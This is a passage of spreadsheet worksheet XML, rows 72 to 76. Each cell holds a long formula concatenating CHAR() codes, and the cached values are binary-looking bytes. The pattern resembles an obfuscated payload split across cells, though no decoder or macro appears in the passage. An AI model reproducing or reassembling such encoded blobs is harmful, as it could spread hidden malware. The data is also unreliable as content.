R(51)&amp;CHAR(233)&amp;CHAR(47)&amp;CHAR(43)&amp;CHAR(157)&amp;CHAR(143)&amp;CHAR(113)&amp;CHAR(16)&amp;CHAR(118)&amp;CHAR(116)&amp;CHAR(191)&amp;CHAR(15)&amp;CHAR(233)&amp;CHAR(78)&amp;CHAR(116)&amp;CHAR(152)&amp;CHAR(134)&amp;CHAR(215)&amp;CHAR(44)&amp;CHAR(129)&amp;CHAR(203)&amp;CHAR(143)&amp;CHAR(145)&amp;CHAR(192)&amp;CHAR(59)&amp;CHAR(250)&amp;CHAR(111)&amp;CHAR(71)&amp;CHAR(190)&amp;CHAR(137)&amp;CHAR(68)&amp;CHAR(208)&amp;CHAR(235)&amp;CHAR(166)&amp;CHAR(81)&amp;CHAR(90)&amp;CHAR(68)&amp;CHAR(237)&amp;CHAR(241)&amp;CHAR(27)&amp;CHAR(109)&amp;CHAR(223)&amp;CHAR(142)&amp;CHAR(82)&amp;CHAR(46)&amp;CHAR(8)&amp;CHAR(168)&amp;CHAR(243)&amp;CHAR(253)&amp;CHAR(120)&amp;CHAR(131)&amp;CHAR(252)&amp;CHAR(219)&amp;CHAR(171)&amp;CHAR(132)&amp;CHAR(194)&amp;CHAR(9)&amp;CHAR(187)&amp;CHAR(43)&amp;CHAR(151)&amp;CHAR(23)&amp;CHAR(12)&amp;CHAR(59)&amp;CHAR(237)&amp;CHAR(164)&amp;CHAR(22)&amp;CHAR(193)</f>
        <v>_x000C_@_x0008_Õ
²Ó_x000B_ä_x000C_E_x0015_oï™QÔŽq0êŠ_x0006_Ú~ï8{]Å!_x000B_ÚnÛñáŽØ[­Ê/k%ô/€_x0011_ÌŒý×˜¤å+Àør×Äc_x0003_ê±ÅÉ–ÀWÙ3hƒÛR_x0010_6‰Ô|aeÃRä¡~‚êö_x001B_I¦£_x0011_œnKÂ:ó¥¢IG_x0006__x0010_eúÏ_x0019_°š1Þ|_x0018_b_x001E_¨_x001E_þÏwV[_x0002_m’í‰_x0016_R5™W#O;Š_x0004_o_x000C_‰Ô_x001B_üRÄëº‘àÁ³7B\Ïsãñ`´6)¦ã&gt;î4‡Î_x000E_âž?ÁPûfì3é/+q_x0010_vt¿_x000F_éNt˜†×,Ë‘À;úoG¾‰DÐë¦QZDíñ_x001B_mßŽR._x0008_¨óýxƒüÛ«„Â	»+—_x0017__x000C_;í¤_x0016_Á</v>
      </c>
      <c r="C72" t="str">
        <f>CHAR(133)&amp;CHAR(96)&amp;CHAR(187)&amp;CHAR(142)&amp;CHAR(187)&amp;CHAR(118)&amp;CHAR(240)&amp;CHAR(19)&amp;CHAR(229)&amp;CHAR(235)</f>
        <v>…`»Ž»vð_x0013_åë</v>
      </c>
    </row>
    <row r="73" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B73" t="str">
        <f>CHAR(156)&amp;CHAR(249)&amp;CHAR(18)&amp;CHAR(1)&amp;CHAR(82)&amp;CHAR(127)&amp;CHAR(226)&amp;CHAR(68)&amp;CHAR(85)&amp;CHAR(35)&amp;CHAR(233)&amp;CHAR(200)&amp;CHAR(211)&amp;CHAR(28)&amp;CHAR(21)&amp;CHAR(140)&amp;CHAR(86)&amp;CHAR(190)&amp;CHAR(240)&amp;CHAR(26)&amp;CHAR(114)&amp;CHAR(204)&amp;CHAR(218)&amp;CHAR(249)&amp;CHAR(155)&amp;CHAR(241)&amp;CHAR(128)&amp;CHAR(233)&amp;CHAR(21)&amp;CHAR(161)&amp;CHAR(124)&amp;CHAR(82)&amp;CHAR(207)&amp;CHAR(180)&amp;CHAR(64)&amp;CHAR(199)&amp;CHAR(88)&amp;CHAR(183)&amp;CHAR(99)&amp;CHAR(12)&amp;CHAR(94)&amp;CHAR(165)&amp;CHAR(97)&amp;CHAR(109)&amp;CHAR(146)&amp;CHAR(29)&amp;CHAR(189)&amp;CHAR(84)&amp;CHAR(137)&amp;CHAR(163)&amp;CHAR(148)&amp;CHAR(1)&amp;CHAR(244)&amp;CHAR(71)&amp;CHAR(202)&amp;CHAR(47)&amp;CHAR(103)&amp;CHAR(171)&amp;CHAR(38)&amp;CHAR(220)&amp;CHAR(119)&amp;CHAR(201)&amp;CHAR(185)&amp;CHAR(97)&amp;CHAR(56)&amp;CHAR(209)&amp;CHAR(158)&amp;CHAR(43)&amp;CHAR(63)&amp;CHAR(91)&amp;CHAR(167)&amp;CHAR(222)&amp;CHAR(204)&amp;CHAR(151)&amp;CHAR(239)&amp;CHAR(42)&amp;CHAR(37)&amp;CHAR(103)&amp;CHAR(143)&amp;CHAR(80)&amp;CHAR(60)&amp;CHAR(68)&amp;CHAR(111)&amp;CHAR(113)&amp;CHAR(155)&amp;CHAR(118)&amp;CHAR(225)&amp;CHAR(28)&amp;CHAR(209)&amp;CHAR(250)&amp;CHAR(128)&amp;CHAR(211)&amp;CHAR(63)&amp;CHAR(210)&amp;CHAR(110)&amp;CHAR(58)&amp;CHAR(145)&amp;CHAR(101)&amp;CHAR(49)&amp;CHAR(149)&amp;CHAR(138)&amp;CHAR(197)&amp;CHAR(142)&amp;CHAR(169)&amp;CHAR(9)&amp;CHAR(125)&amp;CHAR(176)&amp;CHAR(110)&amp;CHAR(105)&amp;CHAR(10)&amp;CHAR(209)&amp;CHAR(130)&amp;CHAR(103)&amp;CHAR(64)&amp;CHAR(229)&amp;CHAR(33)&amp;CHAR(68)&amp;CHAR(212)&amp;CHAR(208)&amp;CHAR(6)&amp;CHAR(130)&amp;CHAR(127)&amp;CHAR(119)&amp;CHAR(17)&amp;CHAR(15)&amp;CHAR(240)&amp;CHAR(186)&amp;CHAR(210)&amp;CHAR(95)&amp;CHAR(127)&amp;CHAR(167)&amp;CHAR(182)&amp;CHAR(7)&amp;CHAR(99)&amp;CHAR(179)&amp;CHAR(206)&amp;CHAR(118)&amp;CHAR(109)&amp;CHAR(202)&amp;CHAR(215)&amp;CHAR(84)&amp;CHAR(235)&amp;CHAR(160)&amp;CHAR(3)&amp;CHAR(213)&amp;CHAR(143)&amp;CHAR(97)&amp;CHAR(10)&amp;CHAR(22)&amp;CHAR(82)&amp;CHAR(176)&amp;CHAR(145)&amp;CHAR(62)&amp;CHAR(78)&amp;CHAR(44)&amp;CHAR(79)&amp;CHAR(14)&amp;CHAR(80)&amp;CHAR(19)&amp;CHAR(176)&amp;CHAR(211)&amp;CHAR(168)&amp;CHAR(164)&amp;CHAR(234)&amp;CHAR(220)&amp;CHAR(194)&amp;CHAR(90)&amp;CHAR(158)&amp;CHAR(168)&amp;CHAR(96)&amp;CHAR(165)&amp;CHAR(72)&amp;CHAR(242)&amp;CHAR(199)&amp;CHAR(38)&amp;CHAR(138)&amp;CHAR(191)&amp;CHAR(119)&amp;CHAR(162)&amp;CHAR(193)&amp;CHAR(166)&amp;CHAR(45)&amp;CHAR(243)&amp;CHAR(167)&amp;CHAR(15)&amp;CHAR(51)&amp;CHAR(195)&amp;CHAR(220)&amp;CHAR(9)&amp;CHAR(195)&amp;CHAR(116)&amp;CHAR(74)&amp;CHAR(154)&amp;CHAR(141)&amp;CHAR(176)&amp;CHAR(59)&amp;CHAR(153)&amp;CHAR(192)&amp;CHAR(22)&amp;CHAR(104)&amp;CHAR(193)&amp;CHAR(212)&amp;CHAR(36)&amp;CHAR(17)&amp;CHAR(59)&amp;CHAR(13)&amp;CHAR(177)&amp;CHAR(171)&amp;CHAR(187)&amp;CHAR(232)&amp;CHAR(116)&amp;CHAR(165)&amp;CHAR(188)&amp;CHAR(92)&amp;CHAR(204)&amp;CHAR(163)&amp;CHAR(210)&amp;CHAR(212)&amp;CHAR(134)&amp;CHAR(255)&amp;CHAR(169)&amp;CHAR(91)&amp;CHAR(96)&amp;CHAR(205)&amp;CHAR(175)&amp;CHAR(226)&amp;CHAR(101)&amp;CHAR(137)&amp;CHAR(220)&amp;CHAR(169)&amp;CHAR(178)&amp;CHAR(41)&amp;CHAR(90)&amp;CHAR(235)&amp;CHAR(46)&amp;CHAR(228)&amp;CHAR(69)&amp;CHAR(172)&amp;CHAR(185)&amp;CHAR(181)&amp;CHAR(203)&amp;CHAR(150)&amp;CHAR(226)&amp;CHAR(205)&amp;CHAR(24)&amp;CHAR(112)&amp;CHAR(165)&amp;CHAR(94)&amp;CHAR(102)&amp;CHAR(160)&amp;CHAR(123)&amp;CHAR(165)&amp;CHAR(44)&amp;CHAR(65)&amp;CHAR(15)</f>
        <v>œù_x0012__x0001_RâDU#éÈÓ_x001C__x0015_ŒV¾ð_x001A_rÌÚù›ñ€é_x0015_¡|RÏ´@ÇX·c_x000C_^¥am’_x001D_½T‰£”_x0001_ôGÊ/g«&amp;ÜwÉ¹a8Ñž+?[§ÞÌ—ï*%gP&lt;Doq›vá_x001C_Ñú€Ó?Òn:‘e1•ŠÅŽ©	}°ni
Ñ‚g@å!DÔÐ_x0006_‚w_x0011__x000F_ðºÒ_§¶_x0007_c³ÎvmÊ×Të _x0003_Õa
_x0016_R°‘&gt;N,O_x000E_P_x0013_°Ó¨¤êÜÂZž¨`¥HòÇ&amp;Š¿w¢Á¦-ó§_x000F_3ÃÜ	ÃtJš°;™À_x0016_hÁÔ$_x0011_;_x000D_±«»èt¥¼\Ì£ÒÔ†ÿ©[`Í¯âe‰Ü©²)Zë.äE¬¹µË–âÍ_x0018_p¥^f {¥,A_x000F_</v>
      </c>
      <c r="C73" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(190)&amp;CHAR(126)&amp;CHAR(52)&amp;CHAR(78)&amp;CHAR(133)&amp;CHAR(102)&amp;CHAR(174)&amp;CHAR(203)</f>
        <v>»ë¾~4N…f®Ë</v>
      </c>
    </row>
    <row r="74" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B74" t="str">
        <f>CHAR(237)&amp;CHAR(51)&amp;CHAR(109)&amp;CHAR(235)&amp;CHAR(107)&amp;CHAR(70)&amp;CHAR(235)&amp;CHAR(73)&amp;CHAR(184)&amp;CHAR(219)&amp;CHAR(140)&amp;CHAR(194)&amp;CHAR(76)&amp;CHAR(160)&amp;CHAR(198)&amp;CHAR(65)&amp;CHAR(144)&amp;CHAR(192)&amp;CHAR(8)&amp;CHAR(128)&amp;CHAR(3)&amp;CHAR(75)&amp;CHAR(83)&amp;CHAR(115)&amp;CHAR(52)&amp;CHAR(125)&amp;CHAR(138)&amp;CHAR(87)&amp;CHAR(147)&amp;CHAR(208)&amp;CHAR(56)&amp;CHAR(116)&amp;CHAR(9)&amp;CHAR(11)&amp;CHAR(30)&amp;CHAR(145)&amp;CHAR(137)&amp;CHAR(246)&amp;CHAR(180)&amp;CHAR(102)&amp;CHAR(123)&amp;CHAR(106)&amp;CHAR(132)&amp;CHAR(147)&amp;CHAR(92)&amp;CHAR(182)&amp;CHAR(64)&amp;CHAR(24)&amp;CHAR(75)&amp;CHAR(64)&amp;CHAR(37)&amp;CHAR(173)&amp;CHAR(106)&amp;CHAR(229)&amp;CHAR(176)&amp;CHAR(231)&amp;CHAR(211)&amp;CHAR(164)&amp;CHAR(195)&amp;CHAR(97)&amp;CHAR(204)&amp;CHAR(118)&amp;CHAR(24)&amp;CHAR(247)&amp;CHAR(1)&amp;CHAR(129)&amp;CHAR(6)&amp;CHAR(208)&amp;CHAR(176)&amp;CHAR(144)&amp;CHAR(47)&amp;CHAR(171)&amp;CHAR(147)&amp;CHAR(131)&amp;CHAR(66)&amp;CHAR(122)&amp;CHAR(214)&amp;CHAR(1)&amp;CHAR(163)&amp;CHAR(213)&amp;CHAR(135)&amp;CHAR(246)&amp;CHAR(128)&amp;CHAR(212)&amp;CHAR(254)&amp;CHAR(49)&amp;CHAR(216)&amp;CHAR(44)&amp;CHAR(184)&amp;CHAR(75)&amp;CHAR(129)&amp;CHAR(77)&amp;CHAR(38)&amp;CHAR(175)&amp;CHAR(149)&amp;CHAR(37)&amp;CHAR(235)&amp;CHAR(100)&amp;CHAR(174)&amp;CHAR(76)&amp;CHAR(102)&amp;CHAR(146)&amp;CHAR(106)&amp;CHAR(148)&amp;CHAR(71)&amp;CHAR(77)&amp;CHAR(14)&amp;CHAR(67)&amp;CHAR(6)&amp;CHAR(43)&amp;CHAR(88)&amp;CHAR(124)&amp;CHAR(151)&amp;CHAR(94)&amp;CHAR(23)&amp;CHAR(188)&amp;CHAR(133)&amp;CHAR(170)&amp;CHAR(100)&amp;CHAR(180)&amp;CHAR(118)&amp;CHAR(203)&amp;CHAR(43)&amp;CHAR(92)&amp;CHAR(10)&amp;CHAR(212)&amp;CHAR(112)&amp;CHAR(86)&amp;CHAR(6)&amp;CHAR(151)&amp;CHAR(193)&amp;CHAR(102)&amp;CHAR(237)&amp;CHAR(186)&amp;CHAR(238)&amp;CHAR(143)&amp;CHAR(249)&amp;CHAR(238)&amp;CHAR(68)&amp;CHAR(201)&amp;CHAR(112)&amp;CHAR(99)&amp;CHAR(57)&amp;CHAR(219)&amp;CHAR(116)&amp;CHAR(89)&amp;CHAR(107)&amp;CHAR(2)&amp;CHAR(5)&amp;CHAR(231)&amp;CHAR(234)&amp;CHAR(158)&amp;CHAR(101)&amp;CHAR(145)&amp;CHAR(192)&amp;CHAR(58)&amp;CHAR(146)&amp;CHAR(112)&amp;CHAR(202)&amp;CHAR(229)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(165)&amp;CHAR(25)&amp;CHAR(106)&amp;CHAR(201)&amp;CHAR(232)&amp;CHAR(229)&amp;CHAR(253)&amp;CHAR(170)&amp;CHAR(184)&amp;CHAR(7)&amp;CHAR(233)&amp;CHAR(121)&amp;CHAR(126)&amp;CHAR(197)&amp;CHAR(160)&amp;CHAR(211)&amp;CHAR(145)&amp;CHAR(169)&amp;CHAR(246)&amp;CHAR(254)&amp;CHAR(126)&amp;CHAR(147)&amp;CHAR(247)&amp;CHAR(94)&amp;CHAR(172)&amp;CHAR(5)&amp;CHAR(234)&amp;CHAR(144)&amp;CHAR(103)&amp;CHAR(193)&amp;CHAR(130)&amp;CHAR(9)&amp;CHAR(243)&amp;CHAR(90)&amp;CHAR(228)&amp;CHAR(204)&amp;CHAR(82)&amp;CHAR(164)&amp;CHAR(191)&amp;CHAR(171)&amp;CHAR(133)&amp;CHAR(72)&amp;CHAR(72)&amp;CHAR(235)&amp;CHAR(165)&amp;CHAR(60)&amp;CHAR(99)&amp;CHAR(198)&amp;CHAR(147)&amp;CHAR(190)&amp;CHAR(78)&amp;CHAR(72)&amp;CHAR(177)&amp;CHAR(55)&amp;CHAR(41)&amp;CHAR(29)&amp;CHAR(51)&amp;CHAR(173)&amp;CHAR(36)&amp;CHAR(192)&amp;CHAR(104)&amp;CHAR(69)&amp;CHAR(30)&amp;CHAR(107)&amp;CHAR(22)&amp;CHAR(243)&amp;CHAR(147)&amp;CHAR(223)&amp;CHAR(41)&amp;CHAR(203)&amp;CHAR(191)&amp;CHAR(173)&amp;CHAR(12)&amp;CHAR(231)&amp;CHAR(84)&amp;CHAR(95)&amp;CHAR(83)&amp;CHAR(13)&amp;CHAR(126)&amp;CHAR(248)&amp;CHAR(213)&amp;CHAR(178)&amp;CHAR(12)&amp;CHAR(35)&amp;CHAR(228)&amp;CHAR(77)&amp;CHAR(103)&amp;CHAR(175)&amp;CHAR(3)&amp;CHAR(78)&amp;CHAR(2)&amp;CHAR(51)&amp;CHAR(168)</f>
        <v>í3mëkFëI¸ÛŒÂL ÆAÀ_x0008_€_x0003_KSs4}ŠW“Ð8t	_x000B__x001E_‘‰ö´f{j„“\¶@_x0018_K@%­jå°çÓ¤ÃaÌv_x0018_÷_x0001__x0006_Ð°/«“ƒBzÖ_x0001_£Õ‡ö€Ôþ1Ø,¸KM&amp;¯•%ëd®Lf’j”GM_x000E_C_x0006_+X|—^_x0017_¼…ªd´vË+\
ÔpV_x0006_—ÁfíºîùîDÉpc9ÛtYk_x0002__x0005_çêže‘À:’pÊå_x0002_	¥_x0019_jÉèåýª¸_x0007_éy~Å Ó‘©öþ~“÷^¬_x0005_êgÁ‚	óZäÌR¤¿«…HHë¥&lt;cÆ“¾NH±7)_x001D_3­$ÀhE_x001E_k_x0016_ó“ß)Ë¿­_x000C_çT_S_x000D_~øÕ²_x000C_#äMg¯_x0003_N_x0002_3¨</v>
      </c>
      <c r="C74" t="str">
        <f>CHAR(243)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(83)&amp;CHAR(133)&amp;CHAR(96)&amp;CHAR(183)&amp;CHAR(206)&amp;CHAR(223)&amp;CHAR(253)</f>
        <v>óýôS…`·Îßý</v>
      </c>
    </row>
    <row r="75" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B75" t="str">
        <f>CHAR(145)&amp;CHAR(175)&amp;CHAR(41)&amp;CHAR(201)&amp;CHAR(164)&amp;CHAR(177)&amp;CHAR(52)&amp;CHAR(190)&amp;CHAR(98)&amp;CHAR(157)&amp;CHAR(155)&amp;CHAR(205)&amp;CHAR(175)&amp;CHAR(235)&amp;CHAR(64)&amp;CHAR(238)&amp;CHAR(225)&amp;CHAR(248)&amp;CHAR(57)&amp;CHAR(26)&amp;CHAR(18)&amp;CHAR(174)&amp;CHAR(121)&amp;CHAR(231)&amp;CHAR(129)&amp;CHAR(99)&amp;CHAR(182)&amp;CHAR(187)&amp;CHAR(230)&amp;CHAR(143)&amp;CHAR(123)&amp;CHAR(12)&amp;CHAR(79)&amp;CHAR(95)&amp;CHAR(188)&amp;CHAR(58)&amp;CHAR(202)&amp;CHAR(139)&amp;CHAR(152)&amp;CHAR(148)&amp;CHAR(73)&amp;CHAR(27)&amp;CHAR(17)&amp;CHAR(255)&amp;CHAR(159)&amp;CHAR(9)&amp;CHAR(161)&amp;CHAR(72)&amp;CHAR(4)&amp;CHAR(208)&amp;CHAR(85)&amp;CHAR(112)&amp;CHAR(135)&amp;CHAR(144)&amp;CHAR(221)&amp;CHAR(197)&amp;CHAR(64)&amp;CHAR(180)&amp;CHAR(112)&amp;CHAR(204)&amp;CHAR(24)&amp;CHAR(202)&amp;CHAR(179)&amp;CHAR(164)&amp;CHAR(11)&amp;CHAR(147)&amp;CHAR(77)&amp;CHAR(60)&amp;CHAR(182)&amp;CHAR(89)&amp;CHAR(176)&amp;CHAR(82)&amp;CHAR(29)&amp;CHAR(200)&amp;CHAR(161)&amp;CHAR(195)&amp;CHAR(64)&amp;CHAR(234)&amp;CHAR(211)&amp;CHAR(141)&amp;CHAR(242)&amp;CHAR(13)&amp;CHAR(160)&amp;CHAR(42)&amp;CHAR(97)&amp;CHAR(158)&amp;CHAR(87)&amp;CHAR(105)&amp;CHAR(67)&amp;CHAR(94)&amp;CHAR(164)&amp;CHAR(245)&amp;CHAR(198)&amp;CHAR(137)&amp;CHAR(86)&amp;CHAR(137)&amp;CHAR(106)&amp;CHAR(77)&amp;CHAR(246)&amp;CHAR(246)&amp;CHAR(11)&amp;CHAR(27)&amp;CHAR(114)&amp;CHAR(238)&amp;CHAR(102)&amp;CHAR(34)&amp;CHAR(155)&amp;CHAR(39)&amp;CHAR(144)&amp;CHAR(34)&amp;CHAR(247)&amp;CHAR(70)&amp;CHAR(132)&amp;CHAR(167)&amp;CHAR(79)&amp;CHAR(81)&amp;CHAR(91)&amp;CHAR(30)&amp;CHAR(155)&amp;CHAR(19)&amp;CHAR(115)&amp;CHAR(189)&amp;CHAR(166)&amp;CHAR(156)&amp;CHAR(207)&amp;CHAR(99)&amp;CHAR(144)&amp;CHAR(190)&amp;CHAR(6)&amp;CHAR(104)&amp;CHAR(4)&amp;CHAR(94)&amp;CHAR(79)&amp;CHAR(20)&amp;CHAR(212)&amp;CHAR(149)&amp;CHAR(138)&amp;CHAR(94)&amp;CHAR(15)&amp;CHAR(85)&amp;CHAR(132)&amp;CHAR(162)&amp;CHAR(89)&amp;CHAR(212)&amp;CHAR(132)&amp;CHAR(96)&amp;CHAR(24)&amp;CHAR(205)&amp;CHAR(173)&amp;CHAR(117)&amp;CHAR(15)&amp;CHAR(76)&amp;CHAR(219)&amp;CHAR(71)&amp;CHAR(142)&amp;CHAR(135)&amp;CHAR(170)&amp;CHAR(182)&amp;CHAR(69)&amp;CHAR(102)&amp;CHAR(140)&amp;CHAR(197)&amp;CHAR(242)&amp;CHAR(179)&amp;CHAR(105)&amp;CHAR(122)&amp;CHAR(250)&amp;CHAR(37)&amp;CHAR(223)&amp;CHAR(147)&amp;CHAR(146)&amp;CHAR(53)&amp;CHAR(214)&amp;CHAR(41)&amp;CHAR(99)&amp;CHAR(71)&amp;CHAR(81)&amp;CHAR(202)&amp;CHAR(181)&amp;CHAR(251)&amp;CHAR(140)&amp;CHAR(85)&amp;CHAR(220)&amp;CHAR(79)&amp;CHAR(144)&amp;CHAR(71)&amp;CHAR(207)&amp;CHAR(141)&amp;CHAR(159)&amp;CHAR(170)&amp;CHAR(139)&amp;CHAR(118)&amp;CHAR(132)&amp;CHAR(136)&amp;CHAR(176)&amp;CHAR(198)&amp;CHAR(202)&amp;CHAR(89)&amp;CHAR(211)&amp;CHAR(204)&amp;CHAR(172)&amp;CHAR(191)&amp;CHAR(128)&amp;CHAR(105)&amp;CHAR(134)&amp;CHAR(68)&amp;CHAR(84)&amp;CHAR(66)&amp;CHAR(255)&amp;CHAR(252)&amp;CHAR(5)&amp;CHAR(119)&amp;CHAR(37)&amp;CHAR(18)&amp;CHAR(111)&amp;CHAR(226)&amp;CHAR(199)&amp;CHAR(145)&amp;CHAR(152)&amp;CHAR(186)&amp;CHAR(9)&amp;CHAR(1)&amp;CHAR(172)&amp;CHAR(95)&amp;CHAR(148)&amp;CHAR(140)&amp;CHAR(37)&amp;CHAR(224)&amp;CHAR(165)&amp;CHAR(201)&amp;CHAR(201)&amp;CHAR(173)&amp;CHAR(39)&amp;CHAR(119)&amp;CHAR(1)&amp;CHAR(224)&amp;CHAR(53)&amp;CHAR(2)&amp;CHAR(109)&amp;CHAR(17)&amp;CHAR(239)&amp;CHAR(165)&amp;CHAR(237)&amp;CHAR(134)&amp;CHAR(157)&amp;CHAR(62)&amp;CHAR(71)&amp;CHAR(27)&amp;CHAR(174)&amp;CHAR(68)&amp;CHAR(206)&amp;CHAR(168)&amp;CHAR(24)&amp;CHAR(72)&amp;CHAR(145)</f>
        <v>‘¯)É¤±4¾b›Í¯ë@îáø9_x001A__x0012_®yçc¶»æ{_x000C_O_¼:Ê‹˜”I_x001B__x0011_ÿŸ	¡H_x0004_ÐUp‡ÝÅ@´pÌ_x0018_Ê³¤_x000B_“M&lt;¶Y°R_x001D_È¡Ã@êÓò_x000D_ *ažWiC^¤õÆ‰V‰jMöö_x000B__x001B_rîf"›'"÷F„§OQ[_x001E_›_x0013_s½¦œÏc¾_x0006_h_x0004_^O_x0014_Ô•Š^_x000F_U„¢YÔ„`_x0018_Í­u_x000F_LÛGŽ‡ª¶EfŒÅò³izú%ß“’5Ö)cGQÊµûŒUÜOGÏŸª‹v„ˆ°ÆÊYÓÌ¬¿€i†DTBÿü_x0005_w%_x0012_oâÇ‘˜º	_x0001_¬_”Œ%à¥ÉÉ­'w_x0001_à5_x0002_m_x0011_ï¥í†&gt;G_x001B_®DÎ¨_x0018_H‘</v>
      </c>
      <c r="C75" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(133)&amp;CHAR(104)&amp;CHAR(122)&amp;CHAR(155)&amp;CHAR(191)&amp;CHAR(118)&amp;CHAR(253)&amp;CHAR(201)</f>
        <v>ô6…hz›¿výÉ</v>
      </c>
    </row>
    <row r="76" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B76" t="str">
        <f>CHAR(101)&amp;CHAR(48)&amp;CHAR(116)&amp;CHAR(45)&amp;CHAR(108)&amp;CHAR(201)&amp;CHAR(170)&amp;CHAR(64)&amp;CHAR(53)&amp;CHAR(120)&amp;CHAR(84)&amp;CHAR(131)&amp;CHAR(7)&amp;CHAR(138)&amp;CHAR(24)&amp;CHAR(126)&amp;CHAR(50)&amp;CHAR(22)&amp;CHAR(225)&amp;CHAR(158)&amp;CHAR(91)&amp;CHAR(150)&amp;CHAR(207)&amp;CHAR(185)&amp;CHAR(164)&amp;CHAR(197)&amp;CHAR(209)&amp;CHAR(240)&amp;CHAR(129)&amp;CHAR(114)&amp;CHAR(13)&amp;CHAR(226)&amp;CHAR(110)&amp;CHAR(247)&amp;CHAR(173)&amp;CHAR(53)&amp;CHAR(136)&amp;CHAR(174)&amp;CHAR(136)&amp;CHAR(12)&amp;CHAR(255)&amp;CHAR(228)&amp;CHAR(70)&amp;CHAR(90)&amp;CHAR(165)&amp;CHAR(219)&amp;CHAR(119)&amp;CHAR(86)&amp;CHAR(156)&amp;CHAR(161)&amp;CHAR(87)&amp;CHAR(31)&amp;CHAR(166)&amp;CHAR(204)&amp;CHAR(248)&amp;CHAR(16)&amp;CHAR(131)&amp;CHAR(75)&amp;CHAR(47)&amp;CHAR(65)&amp;CHAR(106)&amp;CHAR(171)&amp;CHAR(217)&amp;CHAR(221)&amp;CHAR(114)&amp;CHAR(176)&amp;CHAR(204)&amp;CHAR(161)&amp;CHAR(88)&amp;CHAR(46)&amp;CHAR(70)&amp;CHAR(228)&amp;CHAR(78)&amp;CHAR(12)&amp;CHAR(239)&amp;CHAR(59)&amp;CHAR(213)&amp;CHAR(223)&amp;CHAR(7)&amp;CHAR(60)&amp;CHAR(3)&amp;CHAR(87)&amp;CHAR(153)&amp;CHAR(175)&amp;CHAR(85)&amp;CHAR(115)&amp;CHAR(100)&amp;CHAR(242)&amp;CHAR(59)&amp;CHAR(186)&amp;CHAR(198)&amp;CHAR(24)&amp;CHAR(85)&amp;CHAR(26)&amp;CHAR(229)&amp;CHAR(167)&amp;CHAR(213)&amp;CHAR(165)&amp;CHAR(49)&amp;CHAR(50)&amp;CHAR(95)&amp;CHAR(62)&amp;CHAR(247)&amp;CHAR(162)&amp;CHAR(13)&amp;CHAR(201)&amp;CHAR(199)&amp;CHAR(216)&amp;CHAR(15)&amp;CHAR(192)&amp;CHAR(238)&amp;CHAR(122)&amp;CHAR(183)&amp;CHAR(123)&amp;CHAR(38)&amp;CHAR(121)&amp;CHAR(103)&amp;CHAR(99)&amp;CHAR(7)&amp;CHAR(160)&amp;CHAR(194)&amp;CHAR(238)&amp;CHAR(140)&amp;CHAR(132)&amp;CHAR(13)&amp;CHAR(151)&amp;CHAR(197)&amp;CHAR(85)&amp;CHAR(54)&amp;CHAR(24)&amp;CHAR(198)&amp;CHAR(165)&amp;CHAR(242)&amp;CHAR(251)&amp;CHAR(187)&amp;CHAR(174)&amp;CHAR(109)&amp;CHAR(171)&amp;CHAR(158)&amp;CHAR(134)&amp;CHAR(169)&amp;CHAR(201)&amp;CHAR(55)&amp;CHAR(45)&amp;CHAR(70)&amp;CHAR(23)&amp;CHAR(89)&amp;CHAR(211)&amp;CHAR(37)&amp;CHAR(87)&amp;CHAR(91)&amp;CHAR(56)&amp;CHAR(182)&amp;CHAR(35)&amp;CHAR(161)&amp;CHAR(138)&amp;CHAR(104)&amp;CHAR(126)&amp;CHAR(184)&amp;CHAR(206)&amp;CHAR(223)&amp;CHAR(162)&amp;CHAR(233)&amp;CHAR(127)&amp;CHAR(230)&amp;CHAR(104)&amp;CHAR(83)&amp;CHAR(135)&amp;CHAR(205)&amp;CHAR(205)&amp;CHAR(166)&amp;CHAR(234)&amp;CHAR(169)&amp;CHAR(198)&amp;CHAR(93)&amp;CHAR(109)&amp;CHAR(116)&amp;CHAR(85)&amp;CHAR(176)&amp;CHAR(59)&amp;CHAR(174)&amp;CHAR(89)&amp;CHAR(175)&amp;CHAR(76)&amp;CHAR(182)&amp;CHAR(27)&amp;CHAR(241)&amp;CHAR(223)&amp;CHAR(178)&amp;CHAR(57)&amp;CHAR(161)&amp;CHAR(48)&amp;CHAR(42)&amp;CHAR(15)&amp;CHAR(155)&amp;CHAR(170)&amp;CHAR(240)&amp;CHAR(137)&amp;CHAR(148)&amp;CHAR(58)&amp;CHAR(77)&amp;CHAR(191)&amp;CHAR(209)&amp;CHAR(22)&amp;CHAR(238)&amp;CHAR(178)&amp;CHAR(75)&amp;CHAR(90)&amp;CHAR(191)&amp;CHAR(86)&amp;CHAR(82)&amp;CHAR(187)&amp;CHAR(15)&amp;CHAR(182)&amp;CHAR(226)&amp;CHAR(232)&amp;CHAR(102)&amp;CHAR(223)&amp;CHAR(166)&amp;CHAR(227)&amp;CHAR(227)&amp;CHAR(217)&amp;CHAR(11)&amp;CHAR(14)&amp;CHAR(93)&amp;CHAR(126)&amp;CHAR(229)&amp;CHAR(85)&amp;CHAR(224)&amp;CHAR(148)&amp;CHAR(175)&amp;CHAR(173)&amp;CHAR(182)&amp;CHAR(134)&amp;CHAR(180)&amp;CHAR(23)&amp;CHAR(241)&amp;CHAR(165)&amp;CHAR(148)&amp;CHAR(117)&amp;CHAR(171)&amp;CHAR(62)&amp;CHAR(239)&amp;CHAR(76)&amp;CHAR(56)&amp;CHAR(154)&amp;CHAR(46)&amp;CHAR(41)&amp;CHAR(170)&amp;CHAR(113)&amp;CHAR(177)&amp;CHAR(15)&amp;CHAR(119)&amp;CHAR(215)&amp;CHAR(208)</f>
